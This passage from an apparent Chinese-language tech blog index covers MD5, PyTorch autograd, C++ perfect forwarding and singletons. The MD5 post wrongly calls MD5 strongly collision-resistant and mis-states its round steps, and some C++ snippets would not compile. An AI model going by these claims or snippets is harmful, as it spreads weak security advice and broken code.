class="hljs-number">1.5</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">torchtext</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.15</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">torchvision</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.15</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">tqdm</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">4.65</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">tzdata</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2023.3</span><br><br><span class="hljs-attribute">wincertstore</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.2</span><br><br><br></code></pre></td></tr></table></figure><p>文件树：</p><p><img src="/project/../CNN-OpenCV-imgs/FileTree.png" alt="文件目录"></p>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>cv 视觉</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MD5加密算法</title>
    <link href="/project/2023/03/22/MD5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/project/2023/03/22/MD5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>MD5 Message Digest Algorithm 是对任意长度的消息进行运算，产生一个128位的消息摘要。</p><span id="more"></span><h1 id="1-算法特点与作用"><a href="#1-算法特点与作用" class="headerlink" title="1.算法特点与作用"></a>1.算法特点与作用</h1><ul><li>压缩性:任意长度的数据，算出的MD5值长度都是固定的。</li><li>容易计算:从原数据计算出MD5值很容易。</li><li>抗修改性:对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</li><li>强抗碰撞:已知原数据和其MD5值，想找到一个具有相同MD5值的数据(即伪造数据)是非常困难的。</li><li>MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式(就是把一个任意长度的字节串变换成一定长的十六进制数字串)。</li></ul><h1 id="2-算法生成"><a href="#2-算法生成" class="headerlink" title="2.算法生成"></a>2.算法生成</h1><ul><li><p>数据末尾填充0x80</p></li><li><p>计算原始数据的长度</p></li><li><p>用零填充直到数据的字节数是64的倍数为止 按照小端序存储</p></li><li><p>把数据进行分组一组位64（512位）个字节 进行计算最终获得一个16个字节的MD5码</p></li><li><p>初始化四个值  按照小端序存储</p></li><li><p>进行一组数据的计算 定义临时变量并赋值 a = A b = B c = C d = D</p></li><li><p>计算a的值</p><ul><li><blockquote><p>a = (a + F + K[i] +M[g]) &lt;&lt; s[i]) + b</p></blockquote></li></ul></li><li><p>交换数据</p><ul><li><blockquote><p>b = a ; c = b ; d = c ; a = d </p></blockquote></li></ul></li><li><p>循环上述两个步骤64次</p></li><li><p>计算</p><ul><li><blockquote><p>A = A + a ; B = B + b ; C = C + c ; D = D + d</p></blockquote></li></ul></li><li><p>更新中 a , b , c , d 计算组二数据（更新第五步中的 a b c d）</p></li></ul><p>当完成最后一组数据的计算获得 A : B : C : D以小端序组合获得最终16个字节就是MD5</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>加密算法</tag>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>d2l - 自动微分 Day_3</title>
    <link href="/project/2023/03/22/d2l-%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86/"/>
    <url>/project/2023/03/22/d2l-%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>跟李沐学AI的第三天</p><span id="more"></span><h1 id="0-引言"><a href="#0-引言" class="headerlink" title="0.引言"></a>0.引言</h1><p>深度学习框架通过自动计算导数，即自动微分(automatic differentiation)来加快求导。实际中，根据设计好的模型，系统会构建一个计算图(computational graph)，来跟踪计算哪些数据通过哪些操作组合起来产生输出。⾃动微分使系统能够随后反向传播梯度。这⾥，反向传播（backpropagate）意味着跟踪整个计算图，填充关于每个参数的偏导数。</p><h1 id="1-一个简单的例子"><a href="#1-一个简单的例子" class="headerlink" title="1. 一个简单的例子"></a>1. 一个简单的例子</h1><p>作为⼀个演⽰例⼦，假设我们想对函数<em>y</em> = <strong>2x ^T^x</strong>关于列向量<strong>x</strong>求导。⾸先，我们创建变量x并为其分配⼀个初始值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>x = torch.arange(<span class="hljs-number">4.0</span>)<br><br>x<br>OUT:<br>tensor([<span class="hljs-number">0.</span>, <span class="hljs-number">1.</span>, <span class="hljs-number">2.</span>, <span class="hljs-number">3.</span>])<br></code></pre></td></tr></table></figure><p>计算<strong>y</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">2</span> * torch.dot(x,x) <span class="hljs-comment">#dot 计算向量点积</span><br><span class="hljs-built_in">print</span>(y)<br>OUT:<br>    tensor(<span class="hljs-number">28.</span>, grad_fn=&lt;MulBackward0&gt;)<br></code></pre></td></tr></table></figure><p><strong>x</strong>是⼀个⻓度为4的向量，计算x和x的点积，得到了我们赋值给y的标量输出。接下来，通过调⽤<strong>反向传播函数</strong>来⾃动计算<strong>y</strong>关于<strong>x</strong>每个分量的梯度，并打印这些梯度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">y.backward()<br><span class="hljs-built_in">print</span>(x.grad)<br></code></pre></td></tr></table></figure><p>函数<strong>y= 2x ^⊤^x</strong>关于<strong>x</strong>的梯度应为<strong>4x</strong>。让我们快速验证这个梯度是否计算正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x.grad == <span class="hljs-number">4</span> * x<br>OUT:<br>    tensor([<span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>])<br></code></pre></td></tr></table></figure><p>现在计算<strong>x</strong>的另一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在默认情况下，PyTorch会累积梯度，我们需要清除之前的值</span><br>x.grad.zero_()<br>y = x.<span class="hljs-built_in">sum</span>()<br>y.backward()<br><span class="hljs-built_in">print</span>(x.grad)<br>OUT:<br>    tensor([<span class="hljs-number">1.</span>, <span class="hljs-number">1.</span>, <span class="hljs-number">1.</span>, <span class="hljs-number">1.</span>])<br></code></pre></td></tr></table></figure><h1 id="2-非标量变量的反向传播"><a href="#2-非标量变量的反向传播" class="headerlink" title="2.非标量变量的反向传播"></a>2.非标量变量的反向传播</h1><p>当<strong>y</strong>不是标量时，向量<strong>y</strong>关于向量<strong>x</strong>的导数的最自然解释是一个<strong>矩阵</strong>。对于高阶和高维的<strong>y</strong>和<strong>x</strong>，求导的结果可以是一个高阶张量。</p><p>然而，虽然这些更奇特的对象确实出现在高级机器学习中（包括深度学习），但当调用向量的反向计算时，我们通常会试图计算一批训练样本中每个组成部分的损失函数的导数。这里，我们的目的不是计算微分矩阵，而是单独计算批量中每个样本的偏导数之和。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x.grad.zero_()<br>y = x * x<br>y.<span class="hljs-built_in">sum</span>().backward()<br><span class="hljs-built_in">print</span>(x.grad)<br></code></pre></td></tr></table></figure><h1 id="3-分离计算"><a href="#3-分离计算" class="headerlink" title="3.分离计算"></a>3.分离计算</h1><p>有时，我们希望将某些计算移动到记录的计算图之外。例如，假设<strong>y</strong>是作为<strong>x</strong>的函数计算的，⽽<strong>z</strong>则是作为<strong>y</strong>和<strong>x</strong>的函数计算的。想象⼀下，我们想计算<strong>z</strong>关于<strong>x</strong>的梯度，但由于某种原因，希望将<strong>y</strong>视为⼀个常数，并且只考虑到<strong>x</strong>在<strong>y</strong>被计算后发挥的作⽤。这⾥可以分离<strong>y</strong>来返回⼀个新变量<strong>u</strong>，该变量与<strong>y</strong>具有相同的值，但丢弃计算图中如何计算<strong>y</strong>的任何信息。换句话说，梯度不会向后流经<strong>u</strong>到<strong>x</strong>。因此，下⾯的反向传播函数计算<strong>z=u*x</strong>关于x的偏导数，同时将u作为常数处理，⽽不是<strong>z=x * x * x</strong>*关于<strong>x</strong>的偏导数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">x.grad.zero_()<br>y = x * x<br>u = y.detach()   <span class="hljs-comment"># 从 y 中分离出来的一个新变量 不具有y的关于x的计算图 后续求z的偏导时，将y当作一个常数</span><br>z = u * x<br><br>z.<span class="hljs-built_in">sum</span>().backward()<br><span class="hljs-built_in">print</span>(x.grad == u)<br></code></pre></td></tr></table></figure><p>由于记录了<strong>y</strong>的计算结果，我们可以随后在y上调⽤反向传播，得到<strong>y=x * x</strong>关于的<strong>x</strong>的导数，即<strong>2 * x</strong>。</p><h1 id="4-Python控制流的梯度计算"><a href="#4-Python控制流的梯度计算" class="headerlink" title="4.Python控制流的梯度计算"></a>4.Python控制流的梯度计算</h1><p>使⽤⾃动微分的⼀个好处是：即使构建函数的计算图需要通过<strong>Python</strong>控制流（例如，条件、循环或任意函数调⽤），我们仍然可以计算得到的变量的梯度。在下⾯的代码中，<strong>while</strong>循环的迭代次数和<strong>if</strong>语句的结果都取决于输⼊<strong>a</strong>的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">a</span>):<br>    b = a*<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> b.norm() &lt; <span class="hljs-number">1000</span>:<br>        b *= <span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> b.<span class="hljs-built_in">sum</span>() &gt; <span class="hljs-number">0</span>:<br>        c = b<br>    <span class="hljs-keyword">else</span>:<br>        c = <span class="hljs-number">100</span>*b<br>    <span class="hljs-keyword">return</span> c<br></code></pre></td></tr></table></figure><p>让我们计算梯度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a = torch.randn(size=(),requires_grad=<span class="hljs-literal">True</span>)<br>d = f(a)<br>d.backward()<br></code></pre></td></tr></table></figure><p>我们现在可以分析上⾯定义的<strong>f</strong>函数。请注意，它在其输⼊<strong>a</strong>中是分段线性的。换⾔之，对于任何<strong>a</strong>，存在某个常量标量<strong>k</strong>，使得<strong>f(a)=k * a</strong>，其中k的值取决于输⼊<strong>a</strong>，因此可以⽤<strong>d/a</strong>验证梯度是否正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a.grad == d/a<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>跟李沐学AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入完美转发</title>
    <link href="/project/2023/03/21/%E6%B7%B1%E5%85%A5%E5%AE%8C%E7%BE%8E%E8%BD%AC%E5%8F%91/"/>
    <url>/project/2023/03/21/%E6%B7%B1%E5%85%A5%E5%AE%8C%E7%BE%8E%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>深入探讨右值引用应用中的完美转发</p><span id="more"></span><h1 id="1-为什么使用完美转发"><a href="#1-为什么使用完美转发" class="headerlink" title="1.为什么使用完美转发"></a>1.为什么使用完美转发</h1><p>我们先看以下的案例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyClass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">CMyClass</span>() &#123;&#125;;<br>~<span class="hljs-built_in">CMyClass</span>() &#123;&#125;;<br><span class="hljs-type">int</span> m_1 = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-keyword">private</span>:<br><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_1</span><span class="hljs-params">(<span class="hljs-type">int</span> t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;%d&quot;</span>),t);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_1</span><span class="hljs-params">(CMyClass t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;%d&quot;</span>),t.m_1);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Forward_1</span><span class="hljs-params">(T t)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Code_1</span>(t);<br>&#125;<br><br><span class="hljs-type">int</span> _tmain()<br>&#123;<br>    CMyClass Object;<br>    <span class="hljs-built_in">Forward_1</span>(Object); <span class="hljs-comment">//左值</span><br>    <span class="hljs-built_in">Forward_1</span>(<span class="hljs-built_in">CMyClass</span>()); <span class="hljs-comment">//右值</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的Forward_1函数使用值传递参数，会有以下问题：</p><ul><li>值参数会产生额外临时对象拷贝</li></ul><p>所以我们考虑使用引用传递，因为引用传递有以下特性：</p><ul><li>传入引用类型不会有额外的内存开销</li></ul><p>所以我们实现以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;%d&quot;</span>),t);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(CMyClass&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;%d&quot;</span>),t.m_1);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Forward_2</span><span class="hljs-params">(T&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Code_2</span>(t);<br>&#125;<br><br><span class="hljs-type">int</span> _tmain()<br>&#123;<br>    CMyClass Object;<br>    <span class="hljs-built_in">Forward_2</span>(Object); <span class="hljs-comment">//左值</span><br>    <span class="hljs-built_in">Forward_2</span>(<span class="hljs-built_in">CMyClass</span>()); <span class="hljs-comment">//右值</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但又出现了一个问题：</p><ul><li>如何区分左值和右值？</li></ul><p>这就涉及到完美转发，即让一个函数既可以接收左值，又可以接收右值</p><h1 id="2-函数重载实现完美转发"><a href="#2-函数重载实现完美转发" class="headerlink" title="2.函数重载实现完美转发"></a>2.函数重载实现完美转发</h1><p>我们对引用传递参数的代码进行修改，使其可以初步实现完美转发，主要使用了常函数重载：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Left&quot;</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span>&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>    _tprintf(_T(<span class="hljs-string">&quot;Right&quot;</span>))<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(CMyClass&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Left&quot;</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(<span class="hljs-type">const</span> CMyClass&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>    _tprintf(_T(<span class="hljs-string">&quot;Right&quot;</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Forward_1</span><span class="hljs-params">(T&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Code_2</span>(t);<br>&#125;<br><br><span class="hljs-type">int</span> _tmain()<br>&#123;<br>    CMyClass Object;<br>    <span class="hljs-built_in">Forward_1</span>(Object); <span class="hljs-comment">//左值</span><br>    <span class="hljs-built_in">Forward_1</span>(<span class="hljs-built_in">CMyClass</span>()); <span class="hljs-comment">//右值</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在未出现右值引用这一C++新特性前，常函数重载是实现完美转发的惯用方式</p><p>但本文主要介绍使用右值引用实现完美转发的方式，因为常函数重载具有以下缺点：</p><ul><li>编写大量的重载函数模板 造成代码冗余 因为各个模板都需要重载</li><li>无法实现移动语义 因为常函数内部无法对成员进行修改 不能move</li></ul><p>为了解决以上问题，引入右值引用的方法</p><h1 id="3-右值引用实现完美转发"><a href="#3-右值引用实现完美转发" class="headerlink" title="3.右值引用实现完美转发"></a>3.右值引用实现完美转发</h1><p>在函数模板中使用右值引用的语法定义参数被解释为可以接收右值，也可以接收左值此时被成为“万能引用”</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Forward_2</span><span class="hljs-params">(T&amp;&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">Code_2</span>(t);<br>&#125;<br></code></pre></td></tr></table></figure><p>但这是还存在问题：无论传入的形参时左值还是右值，对于模板来说，形参都是可以寻址的，因此都是一个左值</p><p>解决方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Forward_2</span><span class="hljs-params">(T&amp;&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">Code_2</span>(forward&lt;T&gt;(t)); <span class="hljs-comment">//对形参进行强制类型转换 当时左值时还是左值，右值还是右值域，使用的主要方法是引用折叠，如下</span><br>&#125;<br><br><span class="hljs-built_in">Forward_3</span>(Object); <span class="hljs-comment">//左值还是左值</span><br><span class="hljs-comment">//Forward_3(T&amp;&amp; &amp;) == Forward_3(T&amp;) //引用折叠</span><br><br><span class="hljs-built_in">Forward_3</span>(<span class="hljs-built_in">CMyClass</span>()); <span class="hljs-comment">//右值还是右值</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>右值引用的好处 是可以对成员变量进行一个<strong>写操作</strong> 相较于常引用的优点 但常引用既可以绑定左值 又可以绑定右值</p><p>此时<strong>Code_2</strong>代码需要重写：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Left&quot;</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp;&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Right&quot;</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(CMyClass&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Left&quot;</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Code_2</span><span class="hljs-params">(CMyClass&amp;&amp; t)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Right&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>私有构造函数 - singleton</title>
    <link href="/project/2023/03/20/singleton/"/>
    <url>/project/2023/03/20/singleton/</url>
    
    <content type="html"><![CDATA[<p> 使用私有构造函数强化singleton属性</p><span id="more"></span><p><strong>singleton</strong>是指这样的类，它只能<strong>实例化一次</strong>。singleton通常被用来代表那些本质上具有<strong>唯一性</strong>的系统组件，比如视频显示或者文件系统。</p><p>实现<strong>singleton</strong>有两种方法。这两种方法都要把构造函数保持为<strong>私有</strong>的，并且提供一个<strong>静态成员</strong>，以便允许客户能够访问该类唯一的实例：在第一种方法中，公有静态成员是一个<strong>final</strong>域：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">static</span> A&amp; <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>;<br>setUp&#123;....&#125;;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-built_in">A</span>();<br><span class="hljs-built_in">A</span>(<span class="hljs-type">const</span> A&amp; rth);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> A&amp; <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">static</span> A a;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><br><span class="hljs-comment">//调用</span><br>A::<span class="hljs-built_in">getInstace</span>().<span class="hljs-built_in">setUp</span>();<br></code></pre></td></tr></table></figure><p>可以实现私有构造函数的方式：</p><ul><li>static 静态变量</li><li>frient 友元类</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OnlyHeapClass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>   <span class="hljs-function"><span class="hljs-type">static</span> OnlyHeapClass* <span class="hljs-title">GetInstance</span><span class="hljs-params">()</span></span><br><span class="hljs-function">       </span>&#123;<br>              <span class="hljs-comment">// 创建一个OnlyHeapClass对象并返回其指针</span><br>              <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> OnlyHeapClass);<br>       &#125;<br>   <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Destroy</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">private</span>:<br>       <span class="hljs-built_in">OnlyHeapClass</span>() &#123;&#125;<br>       ~<span class="hljs-built_in">OnlyHeapClass</span>()&#123;&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>       OnlyHeapClass *p = OnlyHeapClass::<span class="hljs-built_in">GetInstance</span>();<br>       ... <span class="hljs-comment">// 使用*p</span><br>       <span class="hljs-keyword">delete</span> p;<br>       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>右值引用</title>
    <link href="/project/2023/03/19/%E5%8F%B3%E5%80%BC%E5%BC%95%E7%94%A8/"/>
    <url>/project/2023/03/19/%E5%8F%B3%E5%80%BC%E5%BC%95%E7%94%A8/</url>
    
